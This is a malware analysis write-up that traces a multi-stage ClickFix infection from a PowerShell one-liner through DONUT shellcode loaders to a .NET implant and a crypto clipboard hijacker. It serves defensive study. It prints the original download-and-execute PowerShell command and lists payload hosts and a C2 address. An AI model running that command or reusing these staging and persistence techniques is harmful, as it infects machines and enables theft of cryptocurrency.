Anatomy of a ClickFix Malware
Reddit Case Study – Multi-Stage PowerShell → DONUT Loader → .NET Implant

====================================================================

Initial Discovery
====================================================================

Source:
https://www.reddit.com/r/antivirus/comments/1qy529j/very_tech_illiterate_very_paranoid_ran_a/

The victim executed a PowerShell command obtained from a suspicious webpage,
triggering a multi-stage infection chain.


====================================================================
Stage 1 – Initial Execution
====================================================================

Command executed:

powershell -c iex(irm 158[.]94[.]209[.]33 -UseBasicParsing)

Breakdown:
- IEX → Invoke-Expression
- IRM → Invoke-RestMethod

This downloads remote content from:

158[.]94[.]209[.]33

and executes it directly in memory.

Classic fileless PowerShell staging.


====================================================================
Stage 2 – Secondary PowerShell Payload
====================================================================

The first script retrieves a second PowerShell payload from:

178[.]16[.]53[.]70

This confirms a structured multi-stage loader chain.


====================================================================
Stage 3 – DONUT Shellcode (cptch.bin)
====================================================================

The third stage downloads:

hxxp://94[.]154[.]35[.]115/user_profiles_photo/cptch[.]bin

File:
cptch.bin

Identified via Detect It Easy (DIE) as:

DONUT shellcode v0.9.2

Characteristics:
- Position-independent shellcode
- Converts PE (.NET/EXE/DLL) into in-memory loader
- Starts with opcode 0xE8 (confirmed)

Static unpacking attempts failed.


====================================================================
Stage 4 – Secondary Payload Deployment
====================================================================

cptch.bin performs the following actions:

1) Downloads:
   - cptchbuild.bin
   - clipx64.bin

2) Executes both payloads


--------------------------------------------------------------------
clipx64.bin
--------------------------------------------------------------------

- Native C++ executable
- Identified as cryptocurrency clipboard hijacker
- Intercepts and replaces wallet addresses


--------------------------------------------------------------------
cptchbuild.bin
--------------------------------------------------------------------

- Second DONUT shellcode
- Builds a .NET executable in memory


====================================================================
Stage 5 – .NET Implant (file33.exe)
====================================================================

cptchbuild.bin builds and executes:

file33.exe

The .NET payload was dumped using ExtremeDumper.

Observed behavior:

- Self-deletes after execution
- Inserts persistence entry in registry
- Establishes TCP connection to C2:

  158.94.210.166 : 9993

- Encrypts communication using AES-256
- Performs anti-VM and anti-debug checks

Anti-analysis techniques observed:
- Debug detection
- Environment validation
- Conditional execution safeguards


====================================================================
Dynamic Analysis Notes
====================================================================

The loader:

- Dynamically resolves and loads numerous DLLs
- Uses hashed function resolution
- Avoids standard import table
- Performs internet connectivity checks
- Executes cmd.exe to validate network presence

Process Monitor confirmed outbound network activity
prior to full execution chain.


====================================================================
Infection Chain Summary
====================================================================

User executes PowerShell
        ↓
Stage 1 loader (fileless IEX + IRM)
        ↓
Stage 2 PowerShell
        ↓
Stage 3 DONUT shellcode (cptch.bin)
        ↓
Downloads:
    - cptchbuild.bin
    - clipx64.bin
        ↓
Executes both
        ↓
cptchbuild.bin builds .NET implant (file33.exe)
        ↓
file33.exe:
    - Self deletes
    - Writes registry persistence
    - Connects to 158.94.210.166:9993
    - Encrypts traffic via AES-256
    - Performs anti-VM / anti-debug
        ↓
Final implant stage (analysis stopped here)


====================================================================
Artifacts
====================================================================

All recovered samples are included in:

CLICKFIX.7z
Password: infected

Includes:
- PowerShell stages
- cptch.bin
- cptchbuild.bin
- clipx64.bin
- Dumped .NET payload (file33.exe)


====================================================================
Conclusion
====================================================================

This campaign demonstrates:

- Multi-stage fileless PowerShell execution
- DONUT-based shellcode loaders
- Dynamic API resolution via hashing
- In-memory .NET implant construction
- AES-256 encrypted C2 over TCP
- Registry-based persistence
- Cryptocurrency clipboard hijacking
- Anti-VM and anti-debug techniques
- Self-deleting payload behavior

The structure indicates a modular loader framework designed
for stealth and flexible payload deployment.

Analysis was stopped after confirmation of encrypted C2
communication and implant persistence behavior.
